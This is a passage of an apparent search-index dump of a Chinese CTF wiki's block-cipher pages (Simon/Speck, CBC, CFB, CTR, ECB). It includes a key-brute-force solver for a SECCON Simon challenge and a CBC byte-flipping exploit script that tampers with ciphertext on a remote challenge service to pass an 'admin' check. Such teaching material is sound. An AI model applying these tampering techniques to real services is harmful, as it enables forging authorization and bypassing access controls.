\u6765\u8bf4\uff0c\u5bc6\u94a5\u4e5f\u4f1a\u6709\u6240\u4e0d\u540c \u5176\u4e2d\uff0c z_j z_j \u662f\u7531 Linear Feedback Shift Register (LFSR) \u751f\u6210\u7684\uff0c\u867d\u7136\u5bf9\u4e8e\u4e0d\u540c\u7684 z_j z_j \u7684\u903b\u8f91\u4e0d\u540c\uff0c\u4f46\u662f\u521d\u59cb\u5411\u91cf\u662f\u56fa\u5b9a\u7684\u3002 Constant z_{0} z_{0} =11111010001001010110000111001101111101000100101011000011100110 z_{1} z_{1} =10001110111110010011000010110101000111011111001001100001011010 z_{2} z_{2} =10101111011100000011010010011000101000010001111110010110110011 z_{3} z_{3} =11011011101011000110010111100000010010001010011100110100001111 z_{4} z_{4} =11010001111001101011011000100000010111000011001010010011101111 2017 SECCON Simon and Speck Block Ciphers \u00b6 \u9898\u76ee\u63cf\u8ff0\u5982\u4e0b Simon and Speck Block Ciphers https://eprint.iacr.org/2013/404.pdf Simon_96_64, ECB, key=\"SECCON{xxxx}\", plain=0x6d564d37426e6e71, cipher=0xbb5d12ba422834b5 \u4ece\u540d\u5b57\u4e2d\u53ef\u4ee5\u770b\u51fa\u5bc6\u94a5\u662f 96 \u6bd4\u7279\uff0812 byte\uff09\uff0c\u660e\u6587\u662f 64 \u6bd4\u7279\uff088\u5b57\u8282\uff09\uff0c\u800c\u5bc6\u94a5\u5df2\u7ecf\u7ed9\u51fa\u4e86 8 \u4e2a\u5b57\u8282\uff0c\u53ea\u5269\u4e0b\u56db\u4e2a\u5b57\u8282\u672a\u77e5\u3002\u90a3\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u6cd5\u3002\u8fd9\u91cc\u4ece https://github.com/bozhu/NSA-ciphers/blob/master/simon.py \u83b7\u53d6\u4e86\u4e00\u4efd simon \u52a0\u5bc6\u7b97\u6cd5\u3002 \u5177\u4f53\u5982\u4e0b from pwn import * from simon import SIMON plain = 0x6d564d37426e6e71 cipher = 0xbb5d12ba422834b5 def compare ( key ): key = \"SECCON{\" + key + \"}\" key = key . encode ( 'hex' ) key = int ( key , 16 ) my_simon = SIMON ( 64 , 96 , key ) test = my_simon . encrypt ( plain ) if test == cipher : return True else : return False def solve (): visible = string . uppercase + string . lowercase + string . digits + string . punctuation + \" \" key = pwnlib . util . iters . mbruteforce ( compare , visible , 4 , method = \"fixed\" ) print key if __name__ == \"__main__\" : solve () \u7ed3\u679c\u5982\u4e0b \u279c 2017_seccon_simon_and_speck_block_ciphers git: ( master ) python exp.py [ + ] MBruteforcing: Found key: \"6Pz0\" \u53c2\u8003\u6587\u732e \u00b6 https://en.wikipedia.org/wiki/Simon_(cipher )","title":"Simon and Speck Block Ciphers"},{"location":"crypto/blockcipher/simon-speck/#simon-and-speck-block-ciphers","text":"\u8fd9\u662f\u4e00\u7ec4\u59d0\u59b9\u8f7b\u91cf\u7ea7\u52a0\u5bc6\u3002","title":"Simon and Speck Block Ciphers"},{"location":"crypto/blockcipher/simon-speck/#simon-block-cipher","text":"","title":"Simon Block Cipher"},{"location":"crypto/blockcipher/simon-speck/#_1","text":"Simon \u5757\u52a0\u5bc6\u7b97\u6cd5\u7531 NSA 2013 \u5e74 6 \u6708\u516c\u5e03\uff0c\u4e3b\u8981\u5728 \u786c\u4ef6\u5b9e\u73b0 \u4e0a\u8fdb\u884c\u4e86\u4f18\u5316\u3002 Simon Block Cipher \u662f\u5e73\u8861\u7684 Feistel cipher \u52a0\u5bc6\uff0c\u4e00\u5171\u6709\u4e24\u5757\uff0c\u82e5\u6bcf\u5757\u52a0\u5bc6\u7684\u5927\u5c0f\u4e3a n bits\uff0c\u90a3\u4e48\u660e\u6587\u7684\u5927\u5c0f\u5c31\u662f 2n bits\u3002\u6b64\u5916\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u52a0\u5bc6\u4e2d\u6240\u4f7f\u7528\u7684\u5bc6\u94a5\u957f\u5ea6\u662f\u5757\u957f\u5ea6\u7684\u6574\u6570\u500d\uff0c\u6bd4\u5982 2n\uff0c4n\u7b49\u3002\u5e38\u89c1\u7684 Simon \u52a0\u5bc6\u7b97\u6cd5\u6709 \u4e00\u822c\u6765\u8bf4\uff0cSimon \u7b97\u6cd5\u79f0\u4e4b\u4e3a Simon 2 n /nm\uff0cn \u4e3a\u5757\u5927\u5c0f\uff0cm \u662f\u5757\u5927\u5c0f\u4e0e\u5bc6\u94a5\u4e4b\u95f4\u7684\u500d\u6570\u3002\u6bd4\u5982\u8bf4 Simon 48/96 \u5c31\u662f\u6307\u660e\u6587\u662f 48 \u6bd4\u7279\uff0c\u5bc6\u94a5\u662f 96 \u6bd4\u7279\u7684\u52a0\u5bc6\u7b97\u6cd5\u3002 \u6b64\u5916\uff0c\u5bf9\u4e8e Simon \u5757\u52a0\u5bc6\u7b97\u6cd5\u6765\u8bf4\uff0c\u6bcf\u8f6e\u7684\u52a0\u5bc6\u8fc7\u7a0b\u4e00\u6837\uff0c\u5982\u4e0b \u5f53\u7136\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u8f6e\u4ee5\u53ca\u4e0d\u540c\u7684 m \u6765\u8bf4\uff0c\u5bc6\u94a5\u4e5f\u4f1a\u6709\u6240\u4e0d\u540c \u5176\u4e2d\uff0c z_j z_j \u662f\u7531 Linear Feedback Shift Register (LFSR) \u751f\u6210\u7684\uff0c\u867d\u7136\u5bf9\u4e8e\u4e0d\u540c\u7684 z_j z_j \u7684\u903b\u8f91\u4e0d\u540c\uff0c\u4f46\u662f\u521d\u59cb\u5411\u91cf\u662f\u56fa\u5b9a\u7684\u3002 Constant z_{0} z_{0} =11111010001001010110000111001101111101000100101011000011100110 z_{1} z_{1} =10001110111110010011000010110101000111011111001001100001011010 z_{2} z_{2} =10101111011100000011010010011000101000010001111110010110110011 z_{3} z_{3} =11011011101011000110010111100000010010001010011100110100001111 z_{4} z_{4} =11010001111001101011011000100000010111000011001010010011101111","title":"\u57fa\u672c\u4ecb\u7ecd"},{"location":"crypto/blockcipher/simon-speck/#2017-seccon-simon-and-speck-block-ciphers","text":"\u9898\u76ee\u63cf\u8ff0\u5982\u4e0b Simon and Speck Block Ciphers https://eprint.iacr.org/2013/404.pdf Simon_96_64, ECB, key=\"SECCON{xxxx}\", plain=0x6d564d37426e6e71, cipher=0xbb5d12ba422834b5 \u4ece\u540d\u5b57\u4e2d\u53ef\u4ee5\u770b\u51fa\u5bc6\u94a5\u662f 96 \u6bd4\u7279\uff0812 byte\uff09\uff0c\u660e\u6587\u662f 64 \u6bd4\u7279\uff088\u5b57\u8282\uff09\uff0c\u800c\u5bc6\u94a5\u5df2\u7ecf\u7ed9\u51fa\u4e86 8 \u4e2a\u5b57\u8282\uff0c\u53ea\u5269\u4e0b\u56db\u4e2a\u5b57\u8282\u672a\u77e5\u3002\u90a3\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u66b4\u529b\u7834\u89e3\u7684\u65b9\u6cd5\u3002\u8fd9\u91cc\u4ece https://github.com/bozhu/NSA-ciphers/blob/master/simon.py \u83b7\u53d6\u4e86\u4e00\u4efd simon \u52a0\u5bc6\u7b97\u6cd5\u3002 \u5177\u4f53\u5982\u4e0b from pwn import * from simon import SIMON plain = 0x6d564d37426e6e71 cipher = 0xbb5d12ba422834b5 def compare ( key ): key = \"SECCON{\" + key + \"}\" key = key . encode ( 'hex' ) key = int ( key , 16 ) my_simon = SIMON ( 64 , 96 , key ) test = my_simon . encrypt ( plain ) if test == cipher : return True else : return False def solve (): visible = string . uppercase + string . lowercase + string . digits + string . punctuation + \" \" key = pwnlib . util . iters . mbruteforce ( compare , visible , 4 , method = \"fixed\" ) print key if __name__ == \"__main__\" : solve () \u7ed3\u679c\u5982\u4e0b \u279c 2017_seccon_simon_and_speck_block_ciphers git: ( master ) python exp.py [ + ] MBruteforcing: Found key: \"6Pz0\"","title":"2017 SECCON Simon and Speck Block Ciphers"},{"location":"crypto/blockcipher/simon-speck/#_2","text":"https://en.wikipedia.org/wiki/Simon_(cipher )","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/blockcipher/mode/cbc/","text":"CBC \u00b6 CBC\u5168\u79f0\u4e3a\u5bc6\u7801\u5206\u7ec4\u94fe\u63a5\uff08Cipher-block chaining\uff09 \u6a21\u5f0f\uff0c\u8fd9\u91cc IV \u4e0d\u8981\u6c42\u4fdd\u5bc6 IV \u5fc5\u987b\u662f\u4e0d\u53ef\u9884\u6d4b\u7684\uff0c\u800c\u4e14\u8981\u4fdd\u8bc1\u5b8c\u6574\u6027\u3002 \u52a0\u5bc6 \u00b6 \u89e3\u5bc6 \u00b6 \u4f18\u7f3a\u70b9 \u00b6 \u4f18\u70b9 \u00b6 \u5bc6\u6587\u5757\u4e0d\u4ec5\u548c\u5f53\u524d\u5bc6\u6587\u5757\u76f8\u5173\uff0c\u800c\u4e14\u548c\u524d\u4e00\u4e2a\u5bc6\u6587\u5757\u6216 IV \u76f8\u5173\uff0c\u9690\u85cf\u4e86\u660e\u6587\u7684\u7edf\u8ba1\u7279\u6027\u3002 \u5177\u6709\u6709\u9650\u7684\u4e24\u6b65\u9519\u8bef\u4f20\u64ad\u7279\u6027\uff0c\u5373\u5bc6\u6587\u5757\u4e2d\u7684\u4e00\u4f4d\u53d8\u5316\u53ea\u4f1a\u5f71\u54cd\u5f53\u524d\u5bc6\u6587\u5757\u548c\u4e0b\u4e00\u5bc6\u6587\u5757\u3002 \u5177\u6709\u81ea\u540c\u6b65\u7279\u6027\uff0c\u5373\u7b2c k \u5757\u8d77\u5bc6\u6587\u6b63\u786e\uff0c\u5219\u7b2c k+1 \u5757\u5c31\u80fd\u6b63\u5e38\u89e3\u5bc6\u3002 \u7f3a\u70b9 \u00b6 \u52a0\u5bc6\u4e0d\u80fd\u5e76\u884c\uff0c\u89e3\u5bc6\u53ef\u4ee5\u5e76\u884c\u3002 \u5e94\u7528 \u00b6 CBC \u5e94\u7528\u5341\u5206\u5e7f\u6cdb \u5e38\u89c1\u7684\u6570\u636e\u52a0\u5bc6\u548c TLS \u52a0\u5bc6\u3002 \u5b8c\u6574\u6027\u8ba4\u8bc1\u548c\u8eab\u4efd\u8ba4\u8bc1\u3002 \u653b\u51fb \u00b6 \u5b57\u8282\u53cd\u8f6c\u653b\u51fb \u00b6 \u539f\u7406 \u00b6 \u5b57\u8282\u53cd\u8f6c\u7684\u539f\u7406\u5341\u5206\u7b80\u5355\uff0c\u6211\u4eec\u89c2\u5bdf \u89e3\u5bc6\u8fc7\u7a0b \u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u7279\u6027: IV \u5411\u91cf\u5f71\u54cd\u7b2c\u4e00\u4e2a\u660e\u6587\u5206\u7ec4 \u7b2c n \u4e2a\u5bc6\u6587\u5206\u7ec4\u53ef\u4ee5\u5f71\u54cd\u7b2c n + 1 \u4e2a\u660e\u6587\u5206\u7ec4 \u5047\u8bbe\u7b2c n n \u4e2a\u5bc6\u6587\u5206\u7ec4\u4e3a C_n C_n \uff0c\u89e3\u5bc6\u540e\u7684\u7b2c n n \u4e2a\u660e\u6587\u5206\u7ec4\u4e3a\u4e3a P_n P_n \u3002 \u7136\u540e P_{n+1}=C_n~\\text{xor}~f(C_{n+1}) P_{n+1}=C_n~\\text{xor}~f(C_{n+1}) \u3002 \u5176\u4e2d f f \u51fd\u6570\u4e3a\u56fe\u4e2d\u7684 \\text{Block Cipher Decryption} \\text{Block Cipher Decryption} \u3002 \u5bf9\u4e8e\u67d0\u4e2a\u4fe1\u606f\u5df2\u77e5\u7684\u539f\u6587\u548c\u5bc6\u6587\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u7b2c n n \u4e2a\u5bc6\u6587\u5757 C_n C_n \u4e3a C_n~\\text{xor}~P_{n+1}~\\text{xor}~A C_n~\\text{xor}~P_{n+1}~\\text{xor}~A \u3002\u7136\u540e\u518d\u5bf9\u8fd9\u6761\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u90a3\u4e48\u89e3\u5bc6\u540e\u7684\u7b2c n n \u4e2a\u660e\u6587\u5feb\u5c06\u4f1a\u53d8\u6210 A A \u3002 \u4f8b\u9898 \u00b6 from flag import FLAG from Crypto.Cipher import AES from Crypto import Random import base64 BLOCK_SIZE = 16 IV = Random . new () . read ( BLOCK_SIZE ) passphrase = Random . new () . read ( BLOCK_SIZE ) pad = lambda s : s + ( BLOCK_SIZE - len ( s ) % BLOCK_SIZE ) * chr ( BLOCK_SIZE - len ( s ) % BLOCK_SIZE ) unpad = lambda s : s [: - ord ( s [ len ( s ) - 1 :])] prefix = \"flag=\" + FLAG + \"&userdata=\" suffix = \"&user=guest\" def menu (): print \"1. encrypt\" print \"2. decrypt\" return raw_input ( \"> \" ) def encrypt (): data = raw_input ( \"your data: \" ) plain = prefix + data + suffix aes = AES . new ( passphrase , AES . MODE_CBC , IV ) print base64 . b64encode ( aes . encrypt ( pad ( plain ))) def decrypt (): data = raw_input ( \"input data: \" ) aes = AES . new ( passphrase , AES . MODE_CBC , IV ) plain = unpad ( aes . decrypt ( base64 . b64decode ( data ))) print 'DEBUG ====> ' + plain if plain [ - 5 :] == \"admin\" : print plain else : print \"you are not admin\" def main (): for _ in range ( 10 ): cmd = menu () if cmd == \"1\" : encrypt () elif cmd == \"2\" : decrypt () else : exit () if __name__ == \"__main__\" : main () \u53ef\u89c1\u9898\u76ee\u5e0c\u671b\u6211\u4eec\u63d0\u4f9b\u4e00\u4e2a\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u89e3\u5bc6\u540e\u6700\u540e\u7684\u5185\u5bb9\u4e3aadmin\u3002\u7a0b\u5e8f\u5c06\u4f1a\u8f93\u51fa\u660e\u6587\u3002\u6240\u4ee5\u9898\u76ee\u6d41\u7a0b\u4e3a\u5148\u968f\u4fbf\u63d0\u4f9b\u4e00\u4e2a\u660e\u6587\uff0c\u7136\u540e\u5c06\u5bc6\u6587\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u5f97\u89e3\u5bc6\u540e\u7684\u5b57\u7b26\u4e32\u6700\u540e\u7684\u5185\u5bb9\u4e3aadmin,\u6211\u4eec\u53ef\u4ee5\u679a\u4e3eflag\u7684\u957f\u5ea6\u6765\u786e\u5b9a\u6211\u4eec\u9700\u8981\u5728\u4ec0\u4e48\u4f4d\u7f6e\u8fdb\u884c\u4fee\u6539\u3002 \u4ee5\u4e0b\u662fexp.py from pwn import * import base64 pad = 16 data = 'a' * pad for x in range ( 10 , 100 ): r = remote ( 'xxx.xxx.xxx.xxx' , 10004 ) #r = process('./chall.sh') r . sendlineafter ( '> ' , '1' ) r . sendlineafter ( 'your data: ' , data ) cipher = list ( base64 . b64decode ( r . recv ())) #print 'cipher ===>', ''.join(cipher) BLOCK_SIZE = 16 prefix = \"flag=\" + 'a' * x + \"&userdata=\" suffix = \"&user=guest\" plain = prefix + data + suffix idx = ( 22 + x + pad ) % BLOCK_SIZE + (( 22 + x + pad ) / BLOCK_SIZE - 1 ) * BLOCK_SIZE cipher [ idx + 0 ] = chr ( ord ( cipher [ idx + 0 ]) ^ ord ( 'g' ) ^ ord ( 'a' )) cipher [ idx + 1 ] = chr ( ord ( cipher [ idx + 1 ]) ^ ord ( 'u' ) ^ ord ( 'd' )) cipher [ idx + 2 ] = chr ( ord ( cipher [ idx + 2 ]) ^ ord ( 'e' ) ^ ord ( 'm' )) cipher [ idx + 3 ] = chr ( ord ( cipher [ idx + 3 ]) ^ ord ( 's' ) ^ ord ( 'i' )) cipher [ idx + 4 ] = chr ( ord ( cipher [ idx + 4 ]) ^ ord ( 't' ) ^ ord ( 'n' )) r . sendlineafter ( '> ' , '2' ) r . sendlineafter ( 'input data: ' , base64 . b64encode ( '' . join ( cipher ))) msg = r . recvline () if 'you are not admin' not in msg : print msg break r . close () Padding Oracle Attack \u00b6 \u5177\u4f53\u53c2\u89c1\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002","title":"CBC"},{"location":"crypto/blockcipher/mode/cbc/#cbc","text":"CBC\u5168\u79f0\u4e3a\u5bc6\u7801\u5206\u7ec4\u94fe\u63a5\uff08Cipher-block chaining\uff09 \u6a21\u5f0f\uff0c\u8fd9\u91cc IV \u4e0d\u8981\u6c42\u4fdd\u5bc6 IV \u5fc5\u987b\u662f\u4e0d\u53ef\u9884\u6d4b\u7684\uff0c\u800c\u4e14\u8981\u4fdd\u8bc1\u5b8c\u6574\u6027\u3002","title":"CBC"},{"location":"crypto/blockcipher/mode/cbc/#_1","text":"","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/mode/cbc/#_2","text":"","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/mode/cbc/#_3","text":"","title":"\u4f18\u7f3a\u70b9"},{"location":"crypto/blockcipher/mode/cbc/#_4","text":"\u5bc6\u6587\u5757\u4e0d\u4ec5\u548c\u5f53\u524d\u5bc6\u6587\u5757\u76f8\u5173\uff0c\u800c\u4e14\u548c\u524d\u4e00\u4e2a\u5bc6\u6587\u5757\u6216 IV \u76f8\u5173\uff0c\u9690\u85cf\u4e86\u660e\u6587\u7684\u7edf\u8ba1\u7279\u6027\u3002 \u5177\u6709\u6709\u9650\u7684\u4e24\u6b65\u9519\u8bef\u4f20\u64ad\u7279\u6027\uff0c\u5373\u5bc6\u6587\u5757\u4e2d\u7684\u4e00\u4f4d\u53d8\u5316\u53ea\u4f1a\u5f71\u54cd\u5f53\u524d\u5bc6\u6587\u5757\u548c\u4e0b\u4e00\u5bc6\u6587\u5757\u3002 \u5177\u6709\u81ea\u540c\u6b65\u7279\u6027\uff0c\u5373\u7b2c k \u5757\u8d77\u5bc6\u6587\u6b63\u786e\uff0c\u5219\u7b2c k+1 \u5757\u5c31\u80fd\u6b63\u5e38\u89e3\u5bc6\u3002","title":"\u4f18\u70b9"},{"location":"crypto/blockcipher/mode/cbc/#_5","text":"\u52a0\u5bc6\u4e0d\u80fd\u5e76\u884c\uff0c\u89e3\u5bc6\u53ef\u4ee5\u5e76\u884c\u3002","title":"\u7f3a\u70b9"},{"location":"crypto/blockcipher/mode/cbc/#_6","text":"CBC \u5e94\u7528\u5341\u5206\u5e7f\u6cdb \u5e38\u89c1\u7684\u6570\u636e\u52a0\u5bc6\u548c TLS \u52a0\u5bc6\u3002 \u5b8c\u6574\u6027\u8ba4\u8bc1\u548c\u8eab\u4efd\u8ba4\u8bc1\u3002","title":"\u5e94\u7528"},{"location":"crypto/blockcipher/mode/cbc/#_7","text":"","title":"\u653b\u51fb"},{"location":"crypto/blockcipher/mode/cbc/#_8","text":"","title":"\u5b57\u8282\u53cd\u8f6c\u653b\u51fb"},{"location":"crypto/blockcipher/mode/cbc/#_9","text":"\u5b57\u8282\u53cd\u8f6c\u7684\u539f\u7406\u5341\u5206\u7b80\u5355\uff0c\u6211\u4eec\u89c2\u5bdf \u89e3\u5bc6\u8fc7\u7a0b \u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u7279\u6027: IV \u5411\u91cf\u5f71\u54cd\u7b2c\u4e00\u4e2a\u660e\u6587\u5206\u7ec4 \u7b2c n \u4e2a\u5bc6\u6587\u5206\u7ec4\u53ef\u4ee5\u5f71\u54cd\u7b2c n + 1 \u4e2a\u660e\u6587\u5206\u7ec4 \u5047\u8bbe\u7b2c n n \u4e2a\u5bc6\u6587\u5206\u7ec4\u4e3a C_n C_n \uff0c\u89e3\u5bc6\u540e\u7684\u7b2c n n \u4e2a\u660e\u6587\u5206\u7ec4\u4e3a\u4e3a P_n P_n \u3002 \u7136\u540e P_{n+1}=C_n~\\text{xor}~f(C_{n+1}) P_{n+1}=C_n~\\text{xor}~f(C_{n+1}) \u3002 \u5176\u4e2d f f \u51fd\u6570\u4e3a\u56fe\u4e2d\u7684 \\text{Block Cipher Decryption} \\text{Block Cipher Decryption} \u3002 \u5bf9\u4e8e\u67d0\u4e2a\u4fe1\u606f\u5df2\u77e5\u7684\u539f\u6587\u548c\u5bc6\u6587\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u7b2c n n \u4e2a\u5bc6\u6587\u5757 C_n C_n \u4e3a C_n~\\text{xor}~P_{n+1}~\\text{xor}~A C_n~\\text{xor}~P_{n+1}~\\text{xor}~A \u3002\u7136\u540e\u518d\u5bf9\u8fd9\u6761\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u90a3\u4e48\u89e3\u5bc6\u540e\u7684\u7b2c n n \u4e2a\u660e\u6587\u5feb\u5c06\u4f1a\u53d8\u6210 A A \u3002","title":"\u539f\u7406"},{"location":"crypto/blockcipher/mode/cbc/#_10","text":"from flag import FLAG from Crypto.Cipher import AES from Crypto import Random import base64 BLOCK_SIZE = 16 IV = Random . new () . read ( BLOCK_SIZE ) passphrase = Random . new () . read ( BLOCK_SIZE ) pad = lambda s : s + ( BLOCK_SIZE - len ( s ) % BLOCK_SIZE ) * chr ( BLOCK_SIZE - len ( s ) % BLOCK_SIZE ) unpad = lambda s : s [: - ord ( s [ len ( s ) - 1 :])] prefix = \"flag=\" + FLAG + \"&userdata=\" suffix = \"&user=guest\" def menu (): print \"1. encrypt\" print \"2. decrypt\" return raw_input ( \"> \" ) def encrypt (): data = raw_input ( \"your data: \" ) plain = prefix + data + suffix aes = AES . new ( passphrase , AES . MODE_CBC , IV ) print base64 . b64encode ( aes . encrypt ( pad ( plain ))) def decrypt (): data = raw_input ( \"input data: \" ) aes = AES . new ( passphrase , AES . MODE_CBC , IV ) plain = unpad ( aes . decrypt ( base64 . b64decode ( data ))) print 'DEBUG ====> ' + plain if plain [ - 5 :] == \"admin\" : print plain else : print \"you are not admin\" def main (): for _ in range ( 10 ): cmd = menu () if cmd == \"1\" : encrypt () elif cmd == \"2\" : decrypt () else : exit () if __name__ == \"__main__\" : main () \u53ef\u89c1\u9898\u76ee\u5e0c\u671b\u6211\u4eec\u63d0\u4f9b\u4e00\u4e2a\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u8fd9\u4e2a\u5b57\u7b26\u4e32\u89e3\u5bc6\u540e\u6700\u540e\u7684\u5185\u5bb9\u4e3aadmin\u3002\u7a0b\u5e8f\u5c06\u4f1a\u8f93\u51fa\u660e\u6587\u3002\u6240\u4ee5\u9898\u76ee\u6d41\u7a0b\u4e3a\u5148\u968f\u4fbf\u63d0\u4f9b\u4e00\u4e2a\u660e\u6587\uff0c\u7136\u540e\u5c06\u5bc6\u6587\u8fdb\u884c\u4fee\u6539\uff0c\u4f7f\u5f97\u89e3\u5bc6\u540e\u7684\u5b57\u7b26\u4e32\u6700\u540e\u7684\u5185\u5bb9\u4e3aadmin,\u6211\u4eec\u53ef\u4ee5\u679a\u4e3eflag\u7684\u957f\u5ea6\u6765\u786e\u5b9a\u6211\u4eec\u9700\u8981\u5728\u4ec0\u4e48\u4f4d\u7f6e\u8fdb\u884c\u4fee\u6539\u3002 \u4ee5\u4e0b\u662fexp.py from pwn import * import base64 pad = 16 data = 'a' * pad for x in range ( 10 , 100 ): r = remote ( 'xxx.xxx.xxx.xxx' , 10004 ) #r = process('./chall.sh') r . sendlineafter ( '> ' , '1' ) r . sendlineafter ( 'your data: ' , data ) cipher = list ( base64 . b64decode ( r . recv ())) #print 'cipher ===>', ''.join(cipher) BLOCK_SIZE = 16 prefix = \"flag=\" + 'a' * x + \"&userdata=\" suffix = \"&user=guest\" plain = prefix + data + suffix idx = ( 22 + x + pad ) % BLOCK_SIZE + (( 22 + x + pad ) / BLOCK_SIZE - 1 ) * BLOCK_SIZE cipher [ idx + 0 ] = chr ( ord ( cipher [ idx + 0 ]) ^ ord ( 'g' ) ^ ord ( 'a' )) cipher [ idx + 1 ] = chr ( ord ( cipher [ idx + 1 ]) ^ ord ( 'u' ) ^ ord ( 'd' )) cipher [ idx + 2 ] = chr ( ord ( cipher [ idx + 2 ]) ^ ord ( 'e' ) ^ ord ( 'm' )) cipher [ idx + 3 ] = chr ( ord ( cipher [ idx + 3 ]) ^ ord ( 's' ) ^ ord ( 'i' )) cipher [ idx + 4 ] = chr ( ord ( cipher [ idx + 4 ]) ^ ord ( 't' ) ^ ord ( 'n' )) r . sendlineafter ( '> ' , '2' ) r . sendlineafter ( 'input data: ' , base64 . b64encode ( '' . join ( cipher ))) msg = r . recvline () if 'you are not admin' not in msg : print msg break r . close ()","title":"\u4f8b\u9898"},{"location":"crypto/blockcipher/mode/cbc/#padding-oracle-attack","text":"\u5177\u4f53\u53c2\u89c1\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002","title":"Padding Oracle Attack"},{"location":"crypto/blockcipher/mode/cfb/","text":"CFB \u00b6 CFB \u5168\u79f0\u4e3a\u5bc6\u6587\u53cd\u9988\u6a21\u5f0f\uff08Cipher feedback\uff09\u3002 \u52a0\u5bc6 \u00b6 \u89e3\u5bc6 \u00b6 \u4f18\u7f3a\u70b9 \u00b6 \u4f18\u70b9 \u00b6 \u9002\u5e94\u4e8e\u4e0d\u540c\u6570\u636e\u683c\u5f0f\u7684\u8981\u6c42 \u6709\u9650\u9519\u8bef\u4f20\u64ad \u81ea\u540c\u6b65 \u7f3a\u70b9 \u00b6 \u52a0\u5bc6\u4e0d\u80fd\u5e76\u884c\u5316\uff0c\u89e3\u5bc6\u4e0d\u80fd\u5e76\u884c \u5e94\u7528\u573a\u666f \u00b6 \u8be5\u6a21\u5f0f\u9002\u5e94\u4e8e\u6570\u636e\u5e93\u52a0\u5bc6\uff0c\u65e0\u7ebf\u901a\u4fe1\u52a0\u5bc6\u7b49\u5bf9\u6570\u636e\u683c\u5f0f\u6709\u7279\u6b8a\u8981\u6c42\u7684\u52a0\u5bc6\u73af\u5883\u3002 \u9898\u76ee \u00b6 HITCONCTF-Quals-2015-Simple-(Crypto-100)","title":"CFB"},{"location":"crypto/blockcipher/mode/cfb/#cfb","text":"CFB \u5168\u79f0\u4e3a\u5bc6\u6587\u53cd\u9988\u6a21\u5f0f\uff08Cipher feedback\uff09\u3002","title":"CFB"},{"location":"crypto/blockcipher/mode/cfb/#_1","text":"","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/mode/cfb/#_2","text":"","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/mode/cfb/#_3","text":"","title":"\u4f18\u7f3a\u70b9"},{"location":"crypto/blockcipher/mode/cfb/#_4","text":"\u9002\u5e94\u4e8e\u4e0d\u540c\u6570\u636e\u683c\u5f0f\u7684\u8981\u6c42 \u6709\u9650\u9519\u8bef\u4f20\u64ad \u81ea\u540c\u6b65","title":"\u4f18\u70b9"},{"location":"crypto/blockcipher/mode/cfb/#_5","text":"\u52a0\u5bc6\u4e0d\u80fd\u5e76\u884c\u5316\uff0c\u89e3\u5bc6\u4e0d\u80fd\u5e76\u884c","title":"\u7f3a\u70b9"},{"location":"crypto/blockcipher/mode/cfb/#_6","text":"\u8be5\u6a21\u5f0f\u9002\u5e94\u4e8e\u6570\u636e\u5e93\u52a0\u5bc6\uff0c\u65e0\u7ebf\u901a\u4fe1\u52a0\u5bc6\u7b49\u5bf9\u6570\u636e\u683c\u5f0f\u6709\u7279\u6b8a\u8981\u6c42\u7684\u52a0\u5bc6\u73af\u5883\u3002","title":"\u5e94\u7528\u573a\u666f"},{"location":"crypto/blockcipher/mode/cfb/#_7","text":"HITCONCTF-Quals-2015-Simple-(Crypto-100)","title":"\u9898\u76ee"},{"location":"crypto/blockcipher/mode/ctr/","text":"CTR \u00b6 CTR\u5168\u79f0\u4e3a\u8ba1\u6570\u5668\u6a21\u5f0f\uff08Counter mode\uff09\uff0c\u8be5\u6a21\u5f0f\u7531 Diffe \u548c Hellman \u8bbe\u8ba1\u3002 \u52a0\u5bc6 \u00b6 \u89e3\u5bc6 \u00b6 \u9898\u76ee \u00b6 2017 star ctf ssss 2017 star ctf ssss2","title":"CTR"},{"location":"crypto/blockcipher/mode/ctr/#ctr","text":"CTR\u5168\u79f0\u4e3a\u8ba1\u6570\u5668\u6a21\u5f0f\uff08Counter mode\uff09\uff0c\u8be5\u6a21\u5f0f\u7531 Diffe \u548c Hellman \u8bbe\u8ba1\u3002","title":"CTR"},{"location":"crypto/blockcipher/mode/ctr/#_1","text":"","title":"\u52a0\u5bc6"},{"location":"crypto/blockcipher/mode/ctr/#_2","text":"","title":"\u89e3\u5bc6"},{"location":"crypto/blockcipher/mode/ctr/#_3","text":"2017 star ctf ssss 2017 star ctf ssss2","title":"\u9898\u76ee"},{"location":"crypto/blockcipher/mode/ecb/","text":"ECB \u00b6 ECB\u6a21\u5f0f\u5168\u79f0\u4e3a\u7535\u5b50\u5bc6\u7801\u672c\u6a21\u5f0f\uff08Electronic codebook\uff09\u3002 \u52a0\u5bc6 \u00b6 \u89e3\u5bc6 \u00b6 \u4f18\u7f3a\u70b9 \u00b6 \u4f18\u70b9 \u00b6 \u5b9e\u73b0\u7b80\u5355\u3002 \u4e0d\u540c\u660e\u6587\u5206\u7ec4\u7684\u52a0\u5bc6\u53ef\u4ee5\u5e76\u884c\u8ba1\u7b97\uff0c\u901f\u5ea6\u5f88\u5feb\u3002 \u7f3a\u70b9 \u00b6 \u540c\u6837\u7684\u660e\u6587\u5757\u4f1a\u88ab\u52a0\u5bc6\u6210\u76f8\u540c\u7684\u5bc6\u6587\u5757\uff0c\u4e0d\u4f1a\u9690\u85cf\u660e\u6587\u5206\u7ec4\u7684\u7edf\u8ba1\u89c4\u5f8b\u3002\u6b63\u5982\u4e0b\u56fe\u6240\u793a 